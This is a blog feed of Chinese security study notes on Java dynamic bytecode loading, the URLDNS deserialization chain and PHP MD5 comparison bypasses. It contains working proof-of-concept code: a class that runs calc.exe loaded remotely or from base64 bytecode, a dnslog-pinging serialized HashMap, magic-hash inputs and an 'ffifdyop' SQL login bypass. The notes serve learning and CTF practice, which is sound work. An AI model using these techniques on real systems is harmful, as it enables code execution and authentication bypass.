    <url>/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA动态加载字节码"><a href="#JAVA动态加载字节码" class="headerlink" title="JAVA动态加载字节码"></a>JAVA动态加载字节码</h1><p>本文大多数忘了，因为当时学的时候就是简单了解。现在又是跟着网上的文章复习了一遍。</p><h2 id="Java字节码"><a href="#Java字节码" class="headerlink" title="Java字节码"></a>Java字节码</h2><p><code>Java字节码</code>指的是java虚拟机中的执行使用的一类指令，通常被存储在<code>.class</code>文件中。java之所以能够被盛行，无非就是在不同系统中不需要翻译成对应的0和1，而是间接的翻译成字节码。然后不用系统使用jvm虚拟机就可以运行。（当然这里也有一些条件。）</p><p><strong>ClassLoader处理字节码的流程：loadClass -&gt; findClass -&gt; defineClass</strong></p><h2 id="URLClassLoader远程加载"><a href="#URLClassLoader远程加载" class="headerlink" title="URLClassLoader远程加载"></a>URLClassLoader远程加载</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li>URL未以斜杠&#x2F;结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠&#x2F;结尾，且协议名是file，则使用FildLoader来寻找类，即为在本地系统中寻找.class文件</li><li>URL以斜杠&#x2F;结尾，且协议名不是file，则使用最基础的Loader来寻找类</li></ul><h4 id="Evil恶意类"><a href="#Evil恶意类" class="headerlink" title="Evil恶意类"></a>Evil恶意类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Eivl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Eivl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译一下。</p><h4 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DemoOne</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:1234&quot;</span>);<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;url&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>);<br>        aClass.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里用到的<code>loadClass</code>作用：是从已加载的类缓存、父加载器等位置寻找类，在前面没有找到的情况下，执行 findClass。</strong></p><p><strong><code>findClass</code>作用：根据URL指定的方式来加载类的字节码，可能会在本地系统，jar包或远程http服务器上读取字节码，然后将其交给defineClass。</strong></p><p>在对应的<code>.class</code>文件下开启对应的服务。（phpstudy、python均可）。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015822.png" alt="QQ截图20220301192930"></p><p>运行远程加载，执行后就会弹出计算器。（这里尝试了加<code>\</code>或者不加都可以实现。）</p><h2 id="ClassLoader-defineClass直接加载"><a href="#ClassLoader-defineClass直接加载" class="headerlink" title="ClassLoader#defineClass直接加载"></a>ClassLoader#defineClass直接加载</h2><p><strong>这里所说的<code>denfineClass</code>作用：直接处理传入的字节码，将其处理成java类。</strong></p><p>这里就让我想起反射的时候<code>Class.forname</code>。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>)</span>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>, 是否初始化类, 类加载器)</span>，而<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClass默认不会初始化类方法。<br></code></pre></td></tr></table></figure><p>这里在跟一些大佬的博客的时候，发现许多都是用base64的方法去复现的。用到linux下的命令。（强烈推荐买个vps）。记得删除<code>\n</code>换行符。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015420.png" alt="QQ截图20220301200451"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAMTHhzdzZhL0Vpdmw7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlFaXZsLmphdmEMAAcACAcAGgwAGwAcAQAIY2FsYy5leGUMAB0AHgEACnhzdzZhL0VpdmwBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAGAAQABwANAAgACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAAAAAIAEQ==&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span>(Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        evil.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是呢？这个<code>defineClass</code>作用域被<code>protect</code>限制了。无法在外部访问。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012018186.png" alt="QQ截图20220301201752"></p><p>很巧的是<strong>Templateslmp</strong>却调用了defineClass方法。<br>下面继续复习<strong>Templateslmp的利用</strong>。其实本次讲的都是铺垫。我也就没有跟进去调试。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS链</title>
    <link href="/2022/03/01/URLDNS%E9%93%BE/"/>
    <url>/2022/03/01/URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>该链子常配合dnslog去验证是否存在反序列化（因为该链子不受jdk版本限制，且只依赖原生类。）</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>    HashMap.putVal()<br>        HashMap.hash()<br>            URL.hashCode()<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="HashMap为什么自己实现了writeObject（）和readObject（）"><a href="#HashMap为什么自己实现了writeObject（）和readObject（）" class="headerlink" title="HashMap为什么自己实现了writeObject（）和readObject（）"></a>HashMap为什么自己实现了writeObject（）和readObject（）</h3><p>首先明白一点。如果反序列化该类的时候，该类实现了writeObject（）和readObject（），就会执行该类的这两类方法。</p><p>跟着利用链来分析。</p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>代码非常长，这里只说关键的部分（<code>readObject（）</code>部分）。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002478.png" alt="QQ截图20220228232632"></p><p>跟进<code>hash（key）!</code><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002791.png" alt="QQ截图20220228232754"></p><p>这里return了<code>key.hashCode</code>，那么哪个类又调用了<code>hashCode</code>呢？</p><p>跟着利用链分析，这里的URL类使用了<code>hashcode</code></p><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002555.png" alt="QQ截图20220228233214"></p><p>跟进这里的<code>hashCode</code>。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002994.png" alt="QQ截图20220228233327"></p><p>这里就触发了访问dnslog。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDnsDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://xen3dy.dnslog.cn&quot;</span>);<br>        url.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的这个代码会不会触发dnslog呢？答案是会。跟进去看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002986.png" alt="QQ截图20220228234601"></p><p>同样会往下走,接着触发<code>getHsotAddress()</code>。那如果是这样在序列化的时候就可以触发dnslog了，根本在实战中也起不到验证的作用。<br>那么接下来我们就要去修改这个<code>hashCode</code>的值。怎样修改呢？先来看看<code>hashCode</code>是什么属性吧？<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002790.png" alt="QQ截图20220228235155"></p><p>就反射修改该属性。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDns</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://u5gnvq.dnslog.cn&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> URL.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">haseCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        haseCode.setAccessible(<span class="hljs-literal">true</span>);<br>        haseCode.set(url, <span class="hljs-number">2213</span>);<br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br><br>        haseCode.set(url, -<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于MD5</title>
    <link href="/2022/02/28/%E5%85%B3%E4%BA%8EMD5/"/>
    <url>/2022/02/28/%E5%85%B3%E4%BA%8EMD5/</url>
    
    <content type="html"><![CDATA[<h1 id="关于MD5"><a href="#关于MD5" class="headerlink" title="关于MD5"></a>关于MD5</h1><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131963.png"></p><h2 id="′-x3D-x3D-′"><a href="#′-x3D-x3D-′" class="headerlink" title="′&#x3D;&#x3D;′"></a>′&#x3D;&#x3D;′</h2><p>会先将字符串换成相同类型，再作比较，属于弱类型比较。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;1aaa500&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>==<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131909.png"></p><h2 id="′-x3D-x3D-x3D-′"><a href="#′-x3D-x3D-x3D-′" class="headerlink" title="′&#x3D;&#x3D;&#x3D;′"></a>′&#x3D;&#x3D;&#x3D;′</h2><p>会同时比较字符串的值和类型。（不一一验证）。</p><h2 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a_a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=QNKCDZO&amp;b=aabg7XSs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131242.png" alt="QQ截图20220227222344"></p><p>这里的两个a，b。在MD5加密后变成均为0e开头的字符串，而又通过弱类型比较变为0&#x3D;0。</p><h2 id="md5强比较"><a href="#md5强比较" class="headerlink" title="md5强比较"></a>md5强比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131276.png" alt="QQ截图20220227222810"></p><p><strong>md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到&#x3D;&#x3D;&#x3D;强比较的值相等</strong></p><h2 id="特定条件下的MD验证绕过"><a href="#特定条件下的MD验证绕过" class="headerlink" title="特定条件下的MD验证绕过"></a>特定条件下的MD验证绕过</h2><p>之前就是有一道题刷到过。也是在buuctf上。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ’admin’ <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span>md5($pass,<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>MD5报文将以原始 16字符二进制格式返回</p><p><strong>ffifdyop 字符串经过MD5加密后为276f722736c95d99e921722cf9ed621c</strong><br><strong>在转换成字符串为’or’6乱码</strong></p><p>Select * from ’admin’ where password&#x3D;‘or’6乱码<br><strong>相当于万能密码</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131783.png" alt="QQ截图20220227223725"></p><h2 id="md5强比较（限制字符串）"><a href="#md5强比较（限制字符串）" class="headerlink" title="md5强比较（限制字符串）"></a>md5强比较（限制字符串）</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>需要使用使用md5加密后两个完全相等的两个字符串来绕过过滤。</strong><br>这里就不详细说了。（我没怎么看，我感觉只要知道就行了）</p><p>这里我是真没复现出来。我是真的会谢！！！复现了一晚上加一下午+现在是20.52分。我真的会谢。<br>终于复现出来了。真的会谢。<br><a 